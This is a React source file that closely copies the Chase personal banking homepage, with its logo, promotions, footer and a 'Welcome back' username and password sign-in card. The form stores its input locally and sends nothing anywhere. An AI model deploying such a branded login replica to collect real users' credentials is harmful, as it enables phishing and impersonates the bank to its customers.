"use client";

import { useState } from "react";

/* ───── Chase Logo Mark ───── */
function ChaseLogoMark({ size = 30, color = "#0060a9" }: { size?: number; color?: string }) {
  return (
    <svg width={size} height={size} viewBox="0 0 40 40">
      <g fill={color}>
        <path d="M17 0 h6 v17 h-6 z" />
        <path d="M23 17 h17 v6 h-17 z" />
        <path d="M17 23 h6 v17 h-6 z" />
        <path d="M0 17 h17 v6 h-17 z" />
      </g>
    </svg>
  );
}

function ChevronDown() {
  return (
    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M3 4.5l3 3 3-3" />
    </svg>
  );
}

function SearchIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333" strokeWidth="2">
      <circle cx="11" cy="11" r="8" />
      <line x1="21" y1="21" x2="16.65" y2="16.65" />
    </svg>
  );
}

function ChevronRight({ size = 14, color = "#0060a9" }: { size?: number; color?: string }) {
  return (
    <svg width={size} height={size} viewBox="0 0 12 12" fill="none" stroke={color} strokeWidth="2">
      <path d="M4 2l4 4-4 4" />
    </svg>
  );
}

function ArrowLeft() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2">
      <path d="M15 18l-6-6 6-6" />
    </svg>
  );
}

function ArrowRightNav() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2">
      <path d="M9 18l6-6-6-6" />
    </svg>
  );
}

/* ───── Category Icons ───── */
function CheckingIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" stroke="#333" strokeWidth="1.5">
      <rect x="6" y="12" width="36" height="24" rx="2" />
      <line x1="6" y1="20" x2="42" y2="20" />
      <rect x="10" y="28" width="12" height="4" rx="1" />
    </svg>
  );
}

function InvestmentsIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" stroke="#333" strokeWidth="1.5">
      <polyline points="8,36 18,24 26,30 40,14" />
      <polyline points="34,14 40,14 40,20" />
      <line x1="8" y1="40" x2="40" y2="40" />
    </svg>
  );
}

function CreditCardsIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" stroke="#333" strokeWidth="1.5">
      <rect x="4" y="14" width="32" height="22" rx="2" />
      <rect x="12" y="10" width="32" height="22" rx="2" />
      <line x1="12" y1="18" x2="44" y2="18" />
    </svg>
  );
}

function TravelIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" stroke="#333" strokeWidth="1.5">
      <path d="M24 4L40 18H32V38H16V18H8L24 4Z" />
      <path d="M8 44L18 38M40 44L30 38" />
      <circle cx="24" cy="24" r="4" />
    </svg>
  );
}

function HomeLoansIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" stroke="#333" strokeWidth="1.5">
      <path d="M6 24L24 8L42 24" />
      <path d="M10 22V40H20V30H28V40H38V22" />
    </svg>
  );
}

function AutoIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" stroke="#333" strokeWidth="1.5">
      <path d="M8 30h32M8 30a3 3 0 01-3-3v-4a3 3 0 013-3h2l3-6h22l3 6h2a3 3 0 013 3v4a3 3 0 01-3 3" />
      <circle cx="14" cy="30" r="3" />
      <circle cx="34" cy="30" r="3" />
    </svg>
  );
}

/* ═══════════════════════════════════════════════
   MAIN PAGE - Chase Personal Banking
   ═══════════════════════════════════════════════ */
export default function ChaseMirror() {
  const [activeNav, setActiveNav] = useState<number | null>(null);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);

  const navLinks = [
    "Checking",
    "Savings & CDs",
    "Credit cards",
    "Home loans",
    "Auto",
    "Investing by J.P. Morgan",
    "Education & goals",
    "Travel",
  ];

  const categories = [
    { icon: <CheckingIcon />, label: "Checking" },
    { icon: <InvestmentsIcon />, label: "Investments" },
    { icon: <CreditCardsIcon />, label: "Credit cards" },
    { icon: <TravelIcon />, label: "Travel" },
    { icon: <HomeLoansIcon />, label: "Home loans" },
    { icon: <AutoIcon />, label: "Auto" },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-white">

      {/* ─── TOP UTILITY BAR ─── */}
      <div style={{ borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1280px] mx-auto px-6 flex justify-between items-center h-[40px]">
          <div className="flex items-center gap-6">
            <a
              href="#"
              className="text-[13px] text-black font-medium"
              style={{ borderBottom: "2px solid black", paddingBottom: "1px" }}
            >
              Personal
            </a>
            <a href="#" className="text-[13px] text-gray-600 hover:text-black">Business</a>
            <a href="#" className="text-[13px] text-gray-600 hover:text-black">Commercial</a>
          </div>
          <div className="flex items-center gap-6">
            <a href="#" className="text-[13px] text-gray-700 hover:text-black">Schedule a meeting</a>
            <a href="#" className="text-[13px] text-gray-700 hover:text-black flex items-center gap-1">
              Customer service <ChevronDown />
            </a>
            <a href="#" className="text-[13px] text-gray-700 hover:text-black">Espa&ntilde;ol</a>
            <a href="#" className="hover:opacity-70">
              <SearchIcon />
            </a>
          </div>
        </div>
      </div>

      {/* ─── LOGO ROW ─── */}
      <div style={{ borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1280px] mx-auto px-6 flex items-center h-[64px]">
          <div className="flex items-center gap-2">
            <span className="text-[26px] font-bold tracking-wide" style={{ color: "#1a1a1a", letterSpacing: "0.06em" }}>
              CHASE
            </span>
            <ChaseLogoMark size={30} />
          </div>
        </div>
      </div>

      {/* ─── NAVIGATION BAR ─── */}
      <div
        className="bg-white sticky top-0 z-50"
        style={{ borderBottom: "1px solid #e0e0e0", boxShadow: "0 1px 3px rgba(0,0,0,0.04)" }}
      >
        <div className="max-w-[1280px] mx-auto px-6">
          <nav className="flex items-center" style={{ gap: "0" }}>
            {navLinks.map((link, i) => (
              <div
                key={i}
                className="relative"
                onMouseEnter={() => setActiveNav(i)}
                onMouseLeave={() => setActiveNav(null)}
              >
                <a
                  href="#"
                  className="block text-[14px] transition-colors hover:no-underline whitespace-nowrap"
                  style={{
                    color: activeNav === i ? "#0060a9" : "#333",
                    borderBottom: activeNav === i ? "3px solid #0060a9" : "3px solid transparent",
                    fontWeight: 400,
                    padding: "14px 20px",
                  }}
                >
                  {link}
                </a>
              </div>
            ))}
          </nav>
        </div>
      </div>

      {/* ─── HERO SECTION ─── */}
      <section
        className="relative"
        style={{
          background: "linear-gradient(90deg, #003d7a 0%, #0060a9 40%, #1a8fe3 80%, #3ba0e6 100%)",
          minHeight: "360px",
        }}
      >
        {/* Blue bar top accent */}
        <div className="absolute top-0 left-0 right-0 h-[4px]" style={{ backgroundColor: "#004b8d" }} />

        <div className="max-w-[1280px] mx-auto px-6 flex items-center relative" style={{ minHeight: "360px" }}>
          {/* Left: Promo content */}
          <div className="flex-1 py-12 pr-8">
            <div className="flex items-start gap-8">
              <div>
                <p className="text-white text-[18px] font-medium mb-1">Enjoy up to</p>
                <p className="text-white text-[80px] font-bold leading-none" style={{ letterSpacing: "-2px" }}>
                  $900
                </p>
              </div>
              <div className="pt-2">
                <h1 className="text-white text-[28px] font-bold leading-tight mb-3">
                  New checking &amp; savings<br />customers
                </h1>
                <p className="text-white/90 text-[15px] leading-relaxed mb-6">
                  Enjoy up to $900 when you open a Chase Total Checking<sup>®</sup> and Chase<br />
                  Savings<sup>SM</sup> account with qualifying activities.
                </p>
                <a
                  href="#"
                  className="inline-block text-white text-[14px] font-semibold px-6 py-3 rounded hover:opacity-90 hover:no-underline transition-opacity"
                  style={{ backgroundColor: "#117a37", border: "none" }}
                >
                  Open an account
                </a>
              </div>
            </div>
          </div>

          {/* Right: Sign-in card */}
          <div
            className="bg-white rounded-lg p-8 flex-shrink-0"
            style={{ boxShadow: "0 4px 20px rgba(0,0,0,0.15)", width: "320px" }}
          >
            <h2 className="text-[24px] font-bold mb-6" style={{ color: "#1a1a1a" }}>Welcome back</h2>

            {/* Username */}
            <div className="mb-5">
              <label className="block text-[13px] text-gray-600 mb-1">Username</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full border-0 border-b-2 border-gray-300 py-2 text-[15px] outline-none focus:border-blue-600 bg-transparent"
              />
            </div>

            {/* Password */}
            <div className="mb-5">
              <div className="flex justify-between items-center">
                <label className="block text-[13px] text-gray-600 mb-1">Password</label>
              </div>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full border-0 border-b-2 border-gray-300 py-2 text-[15px] outline-none focus:border-blue-600 bg-transparent pr-14"
                />
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-0 top-2 text-[13px] font-semibold cursor-pointer"
                  style={{ color: "#0060a9" }}
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>
            </div>

            {/* Remember me + Use token */}
            <div className="flex items-center justify-between mb-5">
              <label className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="w-4 h-4 border-2 border-gray-400 rounded cursor-pointer"
                />
                <span className="text-[13px] text-gray-700">Remember me</span>
              </label>
              <a href="#" className="text-[13px] font-semibold flex items-center gap-0.5" style={{ color: "#0060a9" }}>
                Use token <ChevronRight size={10} />
              </a>
            </div>

            {/* Sign in button */}
            <button
              className="w-full text-white text-[16px] font-semibold rounded-full py-3 mb-5 cursor-pointer hover:opacity-90 transition-opacity"
              style={{ backgroundColor: "#0060a9" }}
            >
              Sign in
            </button>

            {/* Links */}
            <div className="flex flex-col gap-2">
              <a href="#" className="text-[13px] font-medium flex items-center gap-0.5" style={{ color: "#0060a9" }}>
                Forgot username/password? <ChevronRight size={10} />
              </a>
              <a href="#" className="text-[13px] font-medium flex items-center gap-0.5" style={{ color: "#0060a9" }}>
                Not Enrolled? Sign Up Now. <ChevronRight size={10} />
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* ─── CHOOSE WHAT'S RIGHT SECTION ─── */}
      <section className="py-14">
        <div className="max-w-[1280px] mx-auto px-6">
          <h2 className="text-center text-[32px] font-light mb-10" style={{ color: "#1a1a1a" }}>
            Choose what&apos;s right for you
          </h2>

          {/* Category icons row */}
          <div className="flex items-center justify-center" style={{ gap: "48px" }}>
            {categories.map((cat, i) => (
              <a
                key={i}
                href="#"
                className="flex flex-col items-center hover:no-underline group"
                style={{ gap: "12px", padding: "8px 0" }}
              >
                <div className="text-gray-500 group-hover:text-blue-700 transition-colors">
                  {cat.icon}
                </div>
                <span className="text-[14px] group-hover:text-blue-700 transition-colors whitespace-nowrap" style={{ color: "#0060a9" }}>
                  {cat.label}
                </span>
              </a>
            ))}
          </div>

          {/* Carousel dots */}
          <div className="flex items-center justify-center gap-3 mt-6">
            <button className="p-1 cursor-pointer hover:opacity-70"><ArrowLeft /></button>
            <div className="w-3 h-3 rounded-full" style={{ backgroundColor: "#333" }} />
            <div className="w-3 h-3 rounded-full" style={{ backgroundColor: "#ccc" }} />
            <button className="p-1 cursor-pointer hover:opacity-70"><ArrowRightNav /></button>
          </div>
        </div>
      </section>

      {/* ─── PROMO CARDS ROW ─── */}
      <section className="pb-16">
        <div className="max-w-[1280px] mx-auto px-6">
          <div className="grid grid-cols-1 md:grid-cols-3" style={{ gap: "20px" }}>

            {/* Card 1: J.P. Morgan Wealth Management */}
            <div className="rounded-lg overflow-hidden" style={{ backgroundColor: "#f5efe6", minHeight: "240px" }}>
              <div style={{ padding: "28px 28px 24px" }}>
                <div className="flex items-start justify-between">
                  <div>
                    <h3 className="text-[20px] font-bold leading-tight" style={{ color: "#1a1a1a" }}>
                      J.P. Morgan Wealth<br />Management
                    </h3>
                  </div>
                  <div className="flex-shrink-0 ml-4">
                    <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                      <circle cx="22" cy="24" r="10" stroke="#c4a67a" strokeWidth="1.5" fill="none" />
                      <circle cx="42" cy="24" r="10" stroke="#c4a67a" strokeWidth="1.5" fill="none" />
                      <circle cx="32" cy="40" r="10" stroke="#c4a67a" strokeWidth="1.5" fill="none" />
                    </svg>
                  </div>
                </div>
                <p className="text-[14px] text-gray-700 leading-relaxed" style={{ marginTop: "16px", marginBottom: "20px" }}>
                  Invest your way with J.P. Morgan. Whether you choose to work with a financial advisor or self-direct your investments.
                </p>
                <a href="#" className="text-[14px] font-semibold flex items-center gap-1" style={{ color: "#0060a9" }}>
                  Get started <ChevronRight />
                </a>
              </div>
            </div>

            {/* Card 2: Chase High School Checking */}
            <div className="rounded-lg overflow-hidden" style={{ backgroundColor: "#0060a9", minHeight: "240px" }}>
              <div style={{ padding: "28px 28px 24px" }}>
                <div className="flex items-start justify-between">
                  <div>
                    <h3 className="text-[20px] font-bold leading-tight text-white">
                      Chase High School<br />Checking<sup>SM</sup>
                    </h3>
                  </div>
                  <div className="flex-shrink-0 ml-4">
                    <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                      <circle cx="32" cy="32" r="24" stroke="rgba(255,255,255,0.3)" strokeWidth="1.5" fill="none" />
                      <text x="32" y="38" textAnchor="middle" fill="rgba(255,255,255,0.5)" fontSize="22" fontWeight="bold">$</text>
                    </svg>
                  </div>
                </div>
                <p className="text-[14px] text-white/80 leading-relaxed" style={{ marginTop: "16px", marginBottom: "20px" }}>
                  Set your teen up for financial success with a checking account designed for ages 13-17.
                </p>
                <a href="#" className="text-[14px] font-semibold flex items-center gap-1 text-white hover:text-white">
                  Learn more <ChevronRight color="white" />
                </a>
              </div>
            </div>

            {/* Card 3: Chase Freedom */}
            <div className="rounded-lg overflow-hidden" style={{ backgroundColor: "#c41230", minHeight: "240px" }}>
              <div style={{ padding: "28px 28px 24px" }}>
                <div className="flex items-start justify-between">
                  <div>
                    <h3 className="text-[20px] font-bold leading-tight text-white">
                      Chase<br />Freedom<sup>®</sup>
                    </h3>
                  </div>
                  <div className="flex-shrink-0 ml-4">
                    <div
                      className="rounded-md flex items-center justify-center"
                      style={{
                        width: "80px",
                        height: "50px",
                        background: "linear-gradient(135deg, #2a5298, #1e3c72)",
                        boxShadow: "0 2px 8px rgba(0,0,0,0.3)",
                      }}
                    >
                      <span className="text-white text-[10px] font-bold tracking-wider">VISA</span>
                    </div>
                  </div>
                </div>
                <p className="text-[14px] text-white/85 leading-relaxed" style={{ marginTop: "16px", marginBottom: "20px" }}>
                  Earn unlimited 1.5% cash back on all purchases. No annual fee and no minimum to redeem.
                </p>
                <a href="#" className="text-[14px] font-semibold flex items-center gap-1 text-white hover:text-white">
                  See details <ChevronRight color="white" />
                </a>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ─── FOOTER ─── */}
      <footer style={{ backgroundColor: "#f5f5f5", borderTop: "1px solid #e0e0e0" }} className="mt-auto">
        <div className="max-w-[1280px] mx-auto px-6 py-10">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 mb-8">
            {[
              {
                title: "About Chase",
                links: ["About Us", "Careers", "Diversity & Inclusion", "Media Center", "Sustainability"],
              },
              {
                title: "Products & Services",
                links: ["Checking Accounts", "Savings Accounts", "Credit Cards", "Mortgages", "Auto Financing", "Investing"],
              },
              {
                title: "Resources",
                links: ["Account Security", "Privacy & Security", "Report Fraud", "ATM & Branch Locator", "Contact Us"],
              },
              {
                title: "Legal",
                links: ["Privacy Policy", "Terms of Use", "Accessibility", "Site Map", "AdChoices"],
              },
            ].map((section, i) => (
              <div key={i}>
                <h4 className="text-[12px] font-bold text-gray-700 uppercase tracking-wider mb-4">
                  {section.title}
                </h4>
                <div className="flex flex-col gap-2.5">
                  {section.links.map((link, j) => (
                    <a key={j} href="#" className="text-[13px] text-gray-600 hover:text-gray-900">{link}</a>
                  ))}
                </div>
              </div>
            ))}
          </div>

          <div className="border-t border-gray-300 pt-6">
            <div className="flex flex-wrap gap-4 mb-4">
              {["Privacy Policy", "Terms of Use", "Accessibility", "CCPA", "AdChoices"].map((link, i) => (
                <span key={i} className="flex items-center gap-4">
                  <a href="#" className="text-[12px] text-gray-600 hover:text-gray-900">{link}</a>
                  {i < 4 && <span className="text-gray-300">|</span>}
                </span>
              ))}
            </div>
            <p className="text-[11px] text-gray-500 leading-relaxed mb-2">
              JPMorgan Chase Bank, N.A. Member FDIC. Equal Housing Lender.
            </p>
            <p className="text-[11px] text-gray-500 leading-relaxed">
              &copy; 2025 JPMorgan Chase &amp; Co. All rights reserved.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
